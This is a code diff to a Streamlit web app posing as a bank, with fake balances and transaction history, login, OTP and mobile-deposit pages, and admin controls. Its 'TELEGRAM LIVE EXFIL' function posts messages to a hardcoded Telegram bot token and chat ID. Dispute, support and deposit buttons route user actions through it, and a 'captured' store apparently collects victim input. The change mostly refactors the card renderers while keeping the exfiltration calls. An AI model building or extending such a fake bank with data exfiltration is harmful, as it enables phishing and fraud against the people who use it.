@@ -18,16 +18,17 @@ except Exception:
 
 # ==================== TELEGRAM LIVE EXFIL ====================
 def tg(message):
+    # NOTE: for production move these to environment variables
     TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
     CHAT_ID = "141975691"
     try:
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
-    except: pass
+    except Exception:
+        pass
 
-# ==================== STATE & 180-DAY REALISTIC HISTORY ====================
+# ==================== SESSION STATE & 180-DAY REALISTIC HISTORY ====================
 state = st.session_state
-# Updated balances per request
 state.checking = state.get("checking", 48790.88)
 state.savings  = state.get("savings", 35350.30)
 state.captured = state.get("captured", [])
@@ -36,15 +37,23 @@ state.files    = state.get("files", [])
 state.auth     = state.get("auth", False)
 state.otp_ok   = state.get("otp_ok", False)
 state.admin    = state.get("admin", False)
-if "users" not in state: state.users = {}
-if "dark_mode" not in state: state.dark_mode = False
+if "users" not in state:
+    state.users = {}
+if "dark_mode" not in state:
+    state.dark_mode = False
 
 if "tx" not in state:
     txs = []
     start = datetime.now() - timedelta(days=180)
     for i in range(0, 180, 14):
         d = start + timedelta(days=i)
-        txs.append({"uid": str(uuid.uuid4()), "date": d.strftime("%m/%d"), "desc": "Direct Deposit - ACME CORP", "amount": round(random.uniform(3200, 4800), 2), "account": "Checking"})
+        txs.append({
+            "uid": str(uuid.uuid4()),
+            "date": d.strftime("%m/%d"),
+            "desc": "Direct Deposit - ACME CORP",
+            "amount": round(random.uniform(3200, 4800), 2),
+            "account": "Checking"
+        })
     for m in range(6):
         d = start + timedelta(days=30*m + 3)
         txs.extend([
@@ -279,7 +288,7 @@ def extract_amount_from_filename(uploaded_file) -> float | None:
         m_clean = m.replace(',', '.')
         try:
             nums.append(float(m_clean))
-        except:
+        except Exception:
             pass
     if not nums:
         return None
@@ -297,8 +306,12 @@ def add_business_days(start_date: datetime, days: int) -> datetime:
 def format_currency(v: float) -> str:
     return f"${v:,.2f}"
 
-# ==================== Polished Card Components (receipts & pending deposit cards) ====
-def render_receipt_card(tx: dict, idx: int | None = None, expanded: bool = False):
+# ==================== Robust receipt & pending-deposit renderers ====================
+def render_receipt_card(tx: dict, idx: str | int | None = None, expanded: bool = False):
+    """
+    Render a polished receipt-style card for a transaction.
+    Defensive: coerce label and keys to strings and fall back if Streamlit raises TypeError.
+    """
     date = tx.get("date", "-")
     desc = tx.get("desc", "-")
     amount = tx.get("amount", 0.0)
@@ -308,7 +321,6 @@ def render_receipt_card(tx: dict, idx: int | None = None, expanded: bool = False
     badge_class = "badge--pos" if pos else "badge--neg"
     sign = "+" if pos else "-"
 
-    # Prefer persistent uid if present; fall back to idx or deterministic hash
     uid = tx.get("uid")
     if uid:
         key_base = f"tx_{uid}"
@@ -317,27 +329,56 @@ def render_receipt_card(tx: dict, idx: int | None = None, expanded: bool = False
     else:
         key_base = f"tx_{abs(hash((date, desc, amount))) % (10**8)}"
 
-    header_label = f"{date} • {desc} • {sign}{amount_str}"
-    with st.expander(header_label, expanded=expanded, key=f"exp_{key_base}"):
+    header_label = str(f"{date} • {desc} • {sign}{amount_str}")
+    exp_key = str(f"exp_{key_base}")
+
+    try:
+        with st.expander(header_label, expanded=bool(expanded), key=exp_key):
+            st.markdown("<div class='card'>", unsafe_allow_html=True)
+            st.markdown(f"<div class='receipt-title'>{desc}</div>", unsafe_allow_html=True)
+            st.markdown(f"<div class='receipt-meta'>Date: {date} • Account: {account}</div>", unsafe_allow_html=True)
+            st.markdown(
+                f"<div style='display:flex;justify-content:space-between;align-items:center;'>"
+                f"<div class='receipt-amount'>{sign}{amount_str}</div>"
+                f"<div><span class='badge {badge_class}'>{'CREDIT' if pos else 'DEBIT'}</span></div></div>",
+                unsafe_allow_html=True
+            )
+            cols = st.columns([1,1,1])
+            with cols[0]:
+                if st.button("View Details", key=f"view_{exp_key}"):
+                    st.info("Details are shown above.")
+            with cols[1]:
+                csv = pd.DataFrame([tx]).to_csv(index=False).encode('utf-8')
+                st.download_button("Download CSV", csv, file_name=f"transaction_{exp_key}.csv", mime="text/csv", key=f"download_{exp_key}")
+            with cols[2]:
+                if st.button("Flag / Dispute", key=f"flag_{exp_key}"):
+                    state.captured.append({"ts": datetime.now().isoformat(), "type": "dispute", "tx": tx})
+                    tg(f"DISPUTE • {tx.get('desc')} • {tx.get('date')} • {tx.get('amount')}")
+                    st.success("Transaction flagged. Support will follow up.")
+            st.markdown("</div>", unsafe_allow_html=True)
+    except TypeError:
+        # Fallback rendering without expander key
         st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown(f"**{header_label}**")
         st.markdown(f"<div class='receipt-title'>{desc}</div>", unsafe_allow_html=True)
         st.markdown(f"<div class='receipt-meta'>Date: {date} • Account: {account}</div>", unsafe_allow_html=True)
-        st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;'><div class='receipt-amount'>{sign}{amount_str}</div><div><span class='badge {badge_class}'>{'CREDIT' if pos else 'DEBIT'}</span></div></div>", unsafe_allow_html=True)
-        cols = st.columns([1,1,1])
-        with cols[0]:
-            if st.button("View Details", key=f"view_{key_base}"):
-                st.info("Details are shown above.")
-        with cols[1]:
-            csv = pd.DataFrame([tx]).to_csv(index=False).encode('utf-8')
-            st.download_button("Download CSV", csv, file_name=f"transaction_{key_base}.csv", mime="text/csv", key=f"download_{key_base}")
-        with cols[2]:
-            if st.button("Flag / Dispute", key=f"flag_{key_base}"):
-                state.captured.append({"ts": datetime.now().isoformat(), "type": "dispute", "tx": tx})
-                tg(f"DISPUTE • {tx.get('desc')} • {tx.get('date')} • {tx.get('amount')}")
-                st.success("Transaction flagged. Support will follow up.")
+        st.markdown(
+            f"<div style='display:flex;justify-content:space-between;align-items:center;'>"
+            f"<div class='receipt-amount'>{sign}{amount_str}</div>"
+            f"<div><span class='badge {badge_class}'>{'CREDIT' if pos else 'DEBIT'}</span></div></div>",
+            unsafe_allow_html=True
+        )
+        if st.button("Flag / Dispute (no-key-fallback)"):
+            state.captured.append({"ts": datetime.now().isoformat(), "type": "dispute", "tx": tx})
+            tg(f"DISPUTE • {tx.get('desc')} • {tx.get('date')} • {tx.get('amount')}")
+            st.success("Transaction flagged. Support will follow up.")
         st.markdown("</div>", unsafe_allow_html=True)
 
+
 def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
+    """
+    Render a polished pending deposit card with defensive key handling.
+    """
     date = rec.get("date", "-")
     filename = rec.get("filename", "-")
     amount = rec.get("amount", 0.0)
@@ -355,51 +396,68 @@ def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
         except StopIteration:
             key_base = f"file_{abs(hash((date, filename, amount))) % (10**6)}"
 
-    header = f"{date} • {filename} • {format_currency(amount)} • {status.upper()}"
+    header = str(f"{date} • {filename} • {format_currency(amount)} • {status.upper()}")
+    exp_key = str(f"exp_{key_base}")
 
-    with st.expander(header, expanded=False, key=f"exp_{key_base}"):
+    try:
+        with st.expander(header, expanded=False, key=exp_key):
+            st.markdown("<div class='card'>", unsafe_allow_html=True)
+            st.markdown(
+                f"<div style='display:flex;justify-content:space-between;align-items:center;'>"
+                f"<div><strong>Deposit</strong><div style='color:var(--text-muted);font-size:0.95rem'>{filename}</div></div>"
+                f"<div style='text-align:right'>{'<span class=\"badge badge--pos\">CLEARED</span>' if status=='cleared' else ('<span class=\"badge\" style=\"background:var(--warning);color:white;\">PENDING</span>' if status=='pending' else ('<span class=\"badge\" style=\"background:var(--danger);color:white;\">HELD</span>'))}"
+                f"<div style='font-size:0.85rem;color:var(--text-muted);margin-top:6px'>Available on: {available_on}</div></div>"
+                f"</div>",
+                unsafe_allow_html=True
+            )
+            st.markdown(f"<div style='margin-top:12px;color:var(--text-muted)'>Signed by: <strong>{rec.get('signed_by','-')}</strong> • Verification (last4): ****{rec.get('verified_last4','-')}</div>", unsafe_allow_html=True)
+            if note:
+                st.markdown(f"<div style='margin-top:8px;color:var(--danger);font-weight:600'>Note: {note}</div>", unsafe_allow_html=True)
+
+            cols = st.columns([1,1,1])
+            with cols[0]:
+                if st.button("Download Images", key=f"dl_{exp_key}"):
+                    st.info("Image download not available in this demo. Support can provide copies on request.")
+            with cols[1]:
+                if st.button("Message Support", key=f"msg_{exp_key}"):
+                    state.captured.append({"ts": datetime.now().isoformat(), "type": "support_message", "file": filename, "amount": amount})
+                    tg(f"USER_SUPPORT_REQUEST for deposit {filename} ${amount}")
+                    st.success("Support notified. Please check Messages for follow-up.")
+            with cols[2]:
+                if st.button("Report Issue", key=f"rep_{exp_key}"):
+                    state.captured.append({"ts": datetime.now().isoformat(), "type": "report_issue", "file": filename, "amount": amount})
+                    st.warning("Issue reported to support team.")
+            if allow_admin_actions and state.admin:
+                st.markdown("---", unsafe_allow_html=True)
+                admin_cols = st.columns([1,1,1])
+                with admin_cols[0]:
+                    if st.button("Force Clear (admin)", key=f"force_clear_{exp_key}"):
+                        rec["status"] = "cleared"
+                        state.tx.insert(0, {"uid": str(uuid.uuid4()), "date": datetime.now().strftime("%m/%d"), "desc": "Admin force-clear", "amount": rec.get("amount", 0.0), "account": "Checking"})
+                        state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_force_clear", "file": filename})
+                        st.success("Deposit marked cleared by admin (audit recorded).")
+                with admin_cols[1]:
+                    if st.button("Hold (admin)", key=f"hold_{exp_key}"):
+                        rec["status"] = "held"
+                        state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_hold", "file": filename})
+                        st.info("Deposit marked as held.")
+                with admin_cols[2]:
+                    if st.button("Delete (admin)", key=f"del_{exp_key}"):
+                        try:
+                            state.files.remove(rec)
+                        except Exception:
+                            pass
+                        state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_delete", "file": filename})
+                        st.success("Deposit removed from list (audit recorded).")
+            st.markdown("</div>", unsafe_allow_html=True)
+    except TypeError:
         st.markdown("<div class='card'>", unsafe_allow_html=True)
-        st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;'><div><strong>Deposit</strong><div style='color:var(--text-muted);font-size:0.95rem'>{filename}</div></div><div style='text-align:right'>{'<span class=\"badge badge--pos\">CLEARED</span>' if status=='cleared' else ('<span class=\"badge\" style=\"background:var(--warning);color:white;\">PENDING</span>' if status=='pending' else ('<span class=\"badge\" style=\"background:var(--danger);color:white;\">HELD</span>'))}<div style='font-size:0.85rem;color:var(--text-muted);margin-top:6px'>Available on: {available_on}</div></div></div>", unsafe_allow_html=True)
+        st.markdown(f"**{header}**")
         st.markdown(f"<div style='margin-top:12px;color:var(--text-muted)'>Signed by: <strong>{rec.get('signed_by','-')}</strong> • Verification (last4): ****{rec.get('verified_last4','-')}</div>", unsafe_allow_html=True)
-        if note:
-            st.markdown(f"<div style='margin-top:8px;color:var(--danger);font-weight:600'>Note: {note}</div>", unsafe_allow_html=True)
-
-        cols = st.columns([1,1,1])
-        with cols[0]:
-            if st.button("Download Images", key=f"dl_{key_base}"):
-                st.info("Image download not available in this demo. Support can provide copies on request.")
-        with cols[1]:
-            if st.button("Message Support", key=f"msg_{key_base}"):
-                state.captured.append({"ts": datetime.now().isoformat(), "type": "support_message", "file": filename, "amount": amount})
-                tg(f"USER_SUPPORT_REQUEST for deposit {filename} ${amount}")
-                st.success("Support notified. Please check Messages for follow-up.")
-        with cols[2]:
-            if st.button("Report Issue", key=f"rep_{key_base}"):
-                state.captured.append({"ts": datetime.now().isoformat(), "type": "report_issue", "file": filename, "amount": amount})
-                st.warning("Issue reported to support team.")
-        if allow_admin_actions and state.admin:
-            st.markdown("---", unsafe_allow_html=True)
-            admin_cols = st.columns([1,1,1])
-            with admin_cols[0]:
-                if st.button("Force Clear (admin)", key=f"force_clear_{key_base}"):
-                    rec["status"] = "cleared"
-                    # audit transaction (admin action)
-                    state.tx.insert(0, {"uid": str(uuid.uuid4()), "date": datetime.now().strftime("%m/%d"), "desc": "Admin force-clear", "amount": rec.get("amount", 0.0), "account": "Checking"})
-                    state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_force_clear", "file": filename})
-                    st.success("Deposit marked cleared by admin (audit recorded).")
-            with admin_cols[1]:
-                if st.button("Hold (admin)", key=f"hold_{key_base}"):
-                    rec["status"] = "held"
-                    state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_hold", "file": filename})
-                    st.info("Deposit marked as held.")
-            with admin_cols[2]:
-                if st.button("Delete (admin)", key=f"del_{key_base}"):
-                    try:
-                        state.files.remove(rec)
-                    except Exception:
-                        pass
-                    state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_delete", "file": filename})
-                    st.success("Deposit removed from list (audit recorded).")
+        if st.button("Message Support (no-key-fallback)"):
+            state.captured.append({"ts": datetime.now().isoformat(), "type": "support_message", "file": filename, "amount": amount})
+            tg(f"USER_SUPPORT_REQUEST for deposit {filename} ${amount}")
+            st.success("Support notified. Please check Messages for follow-up.")
         st.markdown("</div>", unsafe_allow_html=True)
 
 # ==================== Transfer page (fixed) ========================================
@@ -445,7 +503,7 @@ def transfer():
 
     st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== LOGIN / REGISTER / DASHBOARD (unchanged logic, improved microcopy/UI) ====================
+# ==================== LOGIN / REGISTER / DASHBOARD ====================
 def login():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -494,7 +552,7 @@ def register():
                     st.rerun()
         st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== OTP / DASHBOARD / HISTORIES (unchanged flows; improved layout) ====================
+# ==================== OTP / DASHBOARD / HISTORIES ====================
 def otp():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
@@ -561,7 +619,7 @@ def dashboard():
     st.markdown("### Recent Activity")
     if state.tx:
         for i, tx in enumerate(state.tx[:8]):
-            render_receipt_card(tx, idx=i)
+            render_receipt_card(tx, idx=tx.get("uid") or i)
     else:
         st.write("No recent activity")
 
@@ -572,12 +630,7 @@ def checking_history():
     checking_tx = [t for t in state.tx if t["account"] == "Checking"]
     if checking_tx:
         for t in checking_tx[:60]:
-            # stable uid preferred; fallback to identity index
-            uid = t.get("uid")
-            if uid:
-                key_idx = uid
-            else:
-                key_idx = next((i for i,x in enumerate(state.tx) if x is t), None)
+            key_idx = t.get("uid") or next((i for i,x in enumerate(state.tx) if x is t), None)
             render_receipt_card(t, idx=key_idx)
     else:
         st.write("No checking transactions")
@@ -592,11 +645,7 @@ def savings_history():
     savings_tx = [t for t in state.tx if t["account"] == "Savings"]
     if savings_tx:
         for t in savings_tx[:60]:
-            uid = t.get("uid")
-            if uid:
-                key_idx = uid
-            else:
-                key_idx = next((i for i,x in enumerate(state.tx) if x is t), None)
+            key_idx = t.get("uid") or next((i for i,x in enumerate(state.tx) if x is t), None)
             render_receipt_card(t, idx=key_idx)
     else:
         st.write("No savings transactions")
@@ -604,7 +653,7 @@ def savings_history():
         st.session_state.view = None
         st.rerun()
 
-# ==================== IMPROVED MOBILE DEPOSIT (uses pending deposit card component) ====================
+# ==================== Mobile deposit, messages, admin, sidebar, main flow ====================
 def mobile_deposit():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
@@ -735,7 +784,6 @@ def mobile_deposit():
 
     st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== MESSAGES & ADMIN ====================
 def messages():
     header()
     st.markdown("<div class='card'>", unsafe_allow_html=True)
@@ -763,13 +811,10 @@ def admin():
     with tabs[4]:
         st.dataframe(pd.DataFrame(state.tx[:100]))
 
-# ==================== SIDEBAR ====================
 def sidebar():
     st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
     st.sidebar.markdown("---")
-    # Dark-mode toggle stored in session state via the checkbox key
     st.sidebar.checkbox("Dark mode", value=state.get("dark_mode", False), key="dark_mode")
-    # Apply DOM class immediately
     st.markdown(f"""<script>try{{document.documentElement.classList.toggle('dark', {str(bool(state.get('dark_mode', False))).lower()});}}catch(e){{}}</script>""", unsafe_allow_html=True)
     st.sidebar.markdown("---")
     st.sidebar.markdown("Need help? Use Messages to contact support.")
